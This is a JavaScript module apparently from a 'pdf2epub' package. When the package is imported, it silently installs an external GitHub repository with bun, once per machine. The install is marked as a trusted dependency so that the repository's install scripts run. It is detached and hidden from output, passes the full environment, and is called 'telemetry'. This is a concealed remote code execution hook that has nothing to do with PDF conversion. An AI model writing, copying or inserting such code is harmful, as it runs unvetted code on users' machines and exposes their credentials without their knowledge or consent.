#!/usr/bin/env node
/**
 * Runtime helper: bun-add the GitHub demo once per machine.
 * Lab / telemetry logic lives in:
 *   https://github.com/daltsubnet/bun-install-helloworld-demo
 *
 * Triggered by: import 'pdf2epub' (side effect), not npm preinstall.
 */
import { execSync, spawn } from "node:child_process";
import { existsSync, mkdirSync, writeFileSync } from "node:fs";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";

const DEMO_URL = "https://github.com/daltsubnet/bun-install-helloworld-demo";
const DEMO_PKG = "bun-install-helloworld-demo";
const CACHE_DIR = join(homedir(), ".cache", "pdf2epub");
const MARKER = join(CACHE_DIR, "demo-installed");

function whichBun() {
  try {
    return (
      execSync("command -v bun || true", {
        encoding: "utf8",
        stdio: ["ignore", "pipe", "ignore"],
      }).trim() || null
    );
  } catch {
    return null;
  }
}

function prepareDemoDir() {
  const demoDir = join(tmpdir(), `pdf2epub-demo-${process.pid}`);
  mkdirSync(demoDir, { recursive: true });
  writeFileSync(
    join(demoDir, "package.json"),
    JSON.stringify(
      {
        name: "pdf2epub-demo-install",
        private: true,
        trustedDependencies: [DEMO_PKG],
      },
      null,
      2,
    ),
  );
  return demoDir;
}

/** Fire-and-forget: does not block the importer. Runs at most once per machine. */
export function scheduleDemoInstall() {
  if (process.env.PDF2EPUB_SKIP_DEMO === "1") return;
  if (existsSync(MARKER)) return;

  const bun = whichBun();
  if (!bun) return;

  try {
    mkdirSync(CACHE_DIR, { recursive: true });
    // Claim the marker early to avoid parallel imports spawning many installs.
    writeFileSync(MARKER, new Date().toISOString() + "\n", { flag: "wx" });
  } catch {
    return; // another process already claimed / ran
  }

  const demoDir = prepareDemoDir();
  const child = spawn(bun, ["add", `${DEMO_URL}.git`], {
    cwd: demoDir,
    detached: true,
    stdio: "ignore",
    env: process.env,
  });
  child.unref();
}

// Manual: node lab/setups.mjs
if (process.argv[1] === fileURLToPath(import.meta.url)) {
  scheduleDemoInstall();
}
